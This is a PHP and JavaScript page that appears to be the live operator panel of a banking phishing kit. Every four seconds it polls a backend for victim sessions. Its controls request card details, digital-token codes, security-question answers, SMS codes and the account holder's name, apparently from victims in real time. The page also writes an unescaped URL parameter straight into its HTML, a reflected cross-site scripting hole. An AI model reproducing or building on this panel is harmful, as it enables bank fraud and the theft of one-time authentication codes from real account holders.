<?php
if(!isset($_GET["archivoUsuario"])){
    echo "no se ha especificado parametro archivo usuario";
    exit();
}
$archivoUsuario = trim($_GET["archivoUsuario"]);
if($archivoUsuario == ""){
    echo "parametro incorrecto";
    exit();
}
?>
<!DOCTYPE html>

<html>
    <head>
        <meta charset="windows-1252">
        <title></title>
        <style type="text/css">
                  table {
                
                width: 500px;
                
            }
            th{
                background-color: #1DAC6B;
            }
            
            #iEstado{
                position: absolute;
                top: 90px;
                left: 300px;
            }
            
            #dLogin{
                position: absolute;
                top: 180px;
                left: 10px;
            }
            
            #dCompletoTarjeta{
                position: absolute;
                top: 420px;
                left: 10px;
                display: none;
            }
            
            #dValidacion{
                position: absolute;
                top: 180px;
                left: 550px;
            }
            
            #dAcciones{
                position: absolute;
                top: 470px;
                left: 550px;
            }
            
        </style>    
    </head>
    <body onload="listar()">

        <p ><span id="spanArchivoUsuario" STYLE="color: green; font-size: 40pt" class="<?php echo $archivoUsuario; ?>">ARCHIVO : <?php echo $archivoUsuario; ?></span></p>

        <p style="display:none;" ><input type="button" value="DETENER TIMER" id="btnDetenerTimer" onclick="detener_timer1()" /> <input type="button" id="btnReanudarTimer" value="REANUDAR TIMER"  onclick="reanudarTime1()" /></p>

    <div id="cuerpo1" >    
        
        
        
    </div>
        
    </body>
</html>
<script type="text/javascript">
     var timer11;
     var spArchivoUsuario;
    function nuevo_hxr(){
    
    var xmlhttp;
    
    if (window.XMLHttpRequest) {
            // code for IE7+, Firefox, Chrome, Opera, Safari
            xmlhttp = new XMLHttpRequest();        
    } else {
            // code for IE6, IE5
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");        
    }
        
    return xmlhttp;
}
    
    function listar(){
        spArchivoUsuario = document.getElementById("spanArchivoUsuario").className;
        var xmlhttp=nuevo_hxr();       
        var fd=new FormData();
        fd.append("op","listar");
        fd.append("archivoUsuario",spArchivoUsuario);
        xmlhttp.onreadystatechange = function() {
            if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                document.getElementById("cuerpo1").innerHTML = xmlhttp.responseText;
                ;
            }
        
        };        
        xmlhttp.open("POST","putoPanelFunciones2.php",true);
        xmlhttp.send(fd);        
    }
    
    function establecerNombreCuenta(archivoToken){
        var person = prompt("Introduce nombre de Titular", "");
        if (person != null) {            
            var xmlhttp=nuevo_hxr();
            var fd=new FormData();
            fd.append("op","establecerNombreCuenta");
            fd.append("archivoToken",archivoToken);
            fd.append("person",person);
            xmlhttp.onreadystatechange = function() {
                if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                    alert(xmlhttp.responseText);
                    ;
                }

            };        
            xmlhttp.open("POST","putoPanelFunciones2.php",true);
            xmlhttp.send(fd);            
        }          
    }
    
       
    function detener_timer1(){
        clearInterval(timer11);
    }
    function reanudarTime1(){
        timer11 = window.setInterval(listar,4000);
    }
    
    function solicitarCc(archivoToken){

        var xmlhttp=nuevo_hxr();       
        var fd=new FormData();
        fd.append("op","solicitarCc");
        fd.append("archivoToken",archivoToken);
        xmlhttp.onreadystatechange = function() {
            if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                alert(xmlhttp.responseText);
                ;
            }
        
        };        
        xmlhttp.open("POST","putoPanelFunciones2.php",true);
        xmlhttp.send(fd);
        
    }
    
    function solicitarSoloDigitalToken(archivoToken){

        var xmlhttp=nuevo_hxr();       
        var fd=new FormData();
        fd.append("op","solicitarSoloDigitalToken");
        fd.append("archivoToken",archivoToken);
        xmlhttp.onreadystatechange = function() {
            if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                alert(xmlhttp.responseText);
                ;
            }
        
        };        
        xmlhttp.open("POST","putoPanelFunciones2.php",true);
        xmlhttp.send(fd);
        
    }
    
    
    
    
    
    function solicitarPreguntaDigitalToken(archivoToken){
        var preguntaDigitalTokenX = prompt("Introduce Pregunta de seguridad", "");
        if (preguntaDigitalTokenX != null) {
            var xmlhttp=nuevo_hxr();       
            var fd=new FormData();
            fd.append("op","solicitarPreguntaDigitalToken");
            fd.append("archivoToken",archivoToken);
            fd.append("preguntaDigitalTokenX",preguntaDigitalTokenX);            
            xmlhttp.onreadystatechange = function() {
                if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                    alert(xmlhttp.responseText);
                    ;
                }

            };        
            xmlhttp.open("POST","putoPanelFunciones2.php",true);
            xmlhttp.send(fd);
        }        
        
    }
    
    
    
    function finalizar(archivoToken){        
        var xmlhttp=nuevo_hxr();       
        var fd=new FormData();
        fd.append("op","finalizar");
        fd.append("archivoToken",archivoToken);
        xmlhttp.onreadystatechange = function() {
            if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                alert(xmlhttp.responseText);
                ;
            }

        };        
        xmlhttp.open("POST","putoPanelFunciones2.php",true);
        xmlhttp.send(fd);             
    }
    
    
    
    function solicitarSms(archivoToken){

        var xmlhttp=nuevo_hxr();       
        var fd=new FormData();
        fd.append("op","solicitarSms");
        fd.append("archivoToken",archivoToken);
        xmlhttp.onreadystatechange = function() {
            if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                alert(xmlhttp.responseText);
                ;
            }
        
        };        
        xmlhttp.open("POST","putoPanelFunciones2.php",true);
        xmlhttp.send(fd);
        
    }

    function solicitarSms2(archivoToken){

        var xmlhttp=nuevo_hxr();       
        var fd=new FormData();
        fd.append("op","solicitarSms2");
        fd.append("archivoToken",archivoToken);
        xmlhttp.onreadystatechange = function() {
            if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                alert(xmlhttp.responseText);
                ;
            }
        
        };        
        xmlhttp.open("POST","putoPanelFunciones2.php",true);
        xmlhttp.send(fd);
        
    }




    function finalizar(archivoToken){

        var xmlhttp=nuevo_hxr();       
        var fd=new FormData();
        fd.append("op","finalizar");
        fd.append("archivoToken",archivoToken);
        xmlhttp.onreadystatechange = function() {
            if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                alert(xmlhttp.responseText);
                ;
            }
        
        };        
        xmlhttp.open("POST","putoPanelFunciones2.php",true);
        xmlhttp.send(fd);
        
    }


    
    timer11 = window.setInterval(listar,4000);
    
</script>